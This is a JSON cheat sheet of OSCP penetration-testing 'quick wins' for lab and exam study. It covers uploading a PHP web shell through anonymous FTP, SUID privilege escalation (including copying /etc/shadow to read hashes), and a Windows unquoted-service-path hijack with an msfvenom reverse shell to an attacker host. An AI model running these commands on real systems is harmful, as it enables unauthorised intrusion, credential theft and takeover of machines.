{
  "cheatsheets": [
    {
      "id": "quick-wins",
      "name": "Quick Wins - OSCP Low-Hanging Fruit",
      "description": "Fast enumeration checks that frequently lead to immediate compromise in OSCP labs and exams",
      "educational_header": {
        "how_to_recognize": [
          "Services running with default credentials (anonymous FTP, weak admin passwords)",
          "Overly permissive file/directory permissions (world-writable configs, SUID binaries)",
          "Unpatched services with public exploits (outdated SMB, Apache, ProFTPD versions)",
          "Information disclosure via error messages, robots.txt, directory listings",
          "Misconfigurations exposing sensitive data (exposed .git directories, backup files)",
          "Weak authentication mechanisms (no password on SMB shares, sudo NOPASSWD entries)"
        ],
        "when_to_look_for": [
          "Immediately after initial nmap scan shows services (before detailed enumeration)",
          "When time is limited (last 30-60 minutes of OSCP exam)",
          "After gaining initial foothold (check for immediate privesc paths)",
          "When stuck on a box for >1 hour (step back, check basics)",
          "Before running time-consuming scans (LinPEAS, winPEAS, full Nmap)",
          "When service versions are 5+ years old (likely unpatched vulnerabilities)"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Anonymous FTP with Writable Web Root",
          "context": "Target: FTP (21) and HTTP (80) open. Nmap shows 'Anonymous FTP login allowed'. Goal: Check if FTP root maps to web server document root for quick RCE.",
          "approach": "Step 1: Connect anonymously: ftp <TARGET>, username 'anonymous', password blank. Step 2: List files, check for web-related paths (/var/www/html, /srv/http, /home/*/public_html). Step 3: Test write access: put test.txt. Step 4: If successful, upload PHP shell: put shell.php. Step 5: Access via browser: http://<TARGET>/shell.php?cmd=whoami.",
          "commands": [
            "curl-post"
          ],
          "expected_outcome": "FTP shows 226 Transfer complete on PUT command. Browser request to shell.php returns www-data. Time investment: 2-3 minutes. Success rate in OSCP: ~15% of boxes with anonymous FTP. Next steps: Upgrade to reverse shell, enumerate for privesc. Alternative: If write fails but read works, check for config files with credentials (config.php, database.yml, .env).",
          "why_this_works": "Common misconfiguration where FTP root (often /var/ftp or /srv/ftp) is symlinked or mapped to web root. FTP allows anonymous upload without validation, web server executes uploaded PHP without restrictions. Often seen in: Development/staging servers ported to production, Quick-setup web hosting with vsftpd+Apache, Legacy systems with inherited bad configs. OSCP frequency: Higher in older lab boxes (legacy), lower in newer exam machines."
        },
        {
          "title": "Scenario 2: Linux - SUID Binaries with GTFOBins Exploits",
          "context": "Target: SSH access as low-privilege user (jim). Goal: Find SUID binaries that allow privilege escalation without exploits.",
          "approach": "Step 1: Find SUID binaries: find / -perm -4000 2>/dev/null. Step 2: Cross-reference with GTFOBins (https://gtfobins.github.io/) for SUID exploits. Common quick wins: /usr/bin/find, /usr/bin/vim, /usr/bin/nano, /usr/bin/cp, /usr/bin/mv, /usr/bin/less, /usr/bin/more. Step 3: Example with find: find . -exec /bin/sh -p \\; (spawns root shell). Step 4: Verify root: id (should show uid=0).",
          "commands": [
            "check-sudo-privs"
          ],
          "expected_outcome": "First command lists 10-30 SUID binaries (normal). Look for unusual entries (find, vim, nano = red flags). find exploit gives root shell in <10 seconds. Other quick wins: vim -c ':!/bin/sh' (if vim SUID), cp /etc/shadow /tmp/shadow && read hashes (if cp SUID). Time investment: 1-2 minutes to check, instant exploitation. OSCP success rate: ~25% of Linux boxes have exploitable SUID binary.",
          "why_this_works": "SUID bit allows binary to run with owner's privileges (usually root). Intended for legitimate admin tools (passwd, ping, su). Misapplication to editors/file managers creates instant root access. Why admins do this: Convenience (avoid sudo repeatedly), Legacy scripts requiring SUID, Misunderstanding of security implications. GTFOBins maintains current list of exploitable SUID binaries. OSCP tip: Memorize top 5 SUID exploits (find, vim, nmap, bash, less) for speed."
        },
        {
          "title": "Scenario 3: Windows - Unquoted Service Paths",
          "context": "Target: Windows 10/Server 2016 with standard user access (bob). Services running with unquoted paths and writable directories. Goal: Hijack service execution for SYSTEM shell.",
          "approach": "Step 1: Find unquoted service paths: wmic service get name,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\". Step 2: Check write permissions: icacls \"C:\\Program Files\\Vulnerable Service\". Step 3: Create malicious executable: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o Program.exe. Step 4: Copy to exploitable path: copy Program.exe \"C:\\Program.exe\". Step 5: Restart service: sc stop VulnService && sc start VulnService.",
          "commands": [
            "curl-post"
          ],
          "expected_outcome": "Step 1 shows services like: C:\\Program Files\\Vulnerable Service\\service.exe (unquoted, space in path). Step 2 shows: BUILTIN\\Users:(OI)(CI)(M) (write access confirmed). Service restart triggers C:\\Program.exe execution as SYSTEM. Reverse shell connects with nt authority\\system privileges. Time investment: 5-10 minutes. OSCP frequency: ~30% of Windows boxes (common misconfiguration).",
          "why_this_works": "Windows path resolution ambiguity with spaces and no quotes. Path: C:\\Program Files\\Vulnerable Service\\service.exe resolves as: 1) C:\\Program.exe (if exists), 2) C:\\Program Files\\Vulnerable.exe (if exists), 3) C:\\Program Files\\Vulnerable Service\\service.exe (actual). Services run as SYSTEM by default. If C:\\ is writable (often true for BUILTIN\\Users), attacker drops Program.exe, service executes it as SYSTEM. Why common: Lazy installer scripts, Third-party software not following MS best practices, Legacy software never patched. OSCP defense: Always quote service paths in install scripts."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Service-Level Quick Wins (Immediate)",
          "notes": "Check before detailed enumeration. Takes 5-10 minutes total. High success rate in OSCP (40-50% of boxes have at least one quick win).",
          "commands": [
            "check-sudo-privs",
            "curl-post"
          ]
        },
        {
          "title": "Phase 2: Web Application Quick Wins",
          "notes": "After confirming HTTP/HTTPS services. Common quick wins: Default credentials (admin:admin, admin:password), Exposed admin panels (/admin, /manager), Directory listing enabled, LFI/RFI vulnerabilities, Outdated CMS (WordPress, Drupal, Joomla with known exploits).",
          "commands": [
            "curl-post",
            "lfi-test"
          ]
        },
        {
          "title": "Phase 3: Post-Compromise Quick Wins (Linux)",
          "notes": "After initial foothold. Run immediately before full LinPEAS scan. Checks: sudo -l (NOPASSWD entries), find / -perm -4000 (SUID binaries), ls -la /etc/cron* (writable cron jobs), cat /etc/exports (NFS shares with no_root_squash), docker ps (Docker group membership).",
          "commands": [
            "check-sudo-privs",
            "sudo-exploit-find"
          ]
        },
        {
          "title": "Phase 4: Post-Compromise Quick Wins (Windows)",
          "notes": "After initial foothold. Run before full winPEAS scan. Checks: whoami /priv (SeImpersonatePrivilege = potato attacks), accesschk.exe -uwcqv (unquoted service paths), reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated (MSI privesc), net localgroup administrators (admin group membership), cmdkey /list (stored credentials).",
          "commands": [
            "curl-post"
          ]
        }
      ],
      "tags": [
        "OSCP:HIGH",
        "QUICK_WIN",
        "ENUMERATION",
        "PRIVESC",
        "TIME_SENSITIVE"
      ]
    }
  ]
}
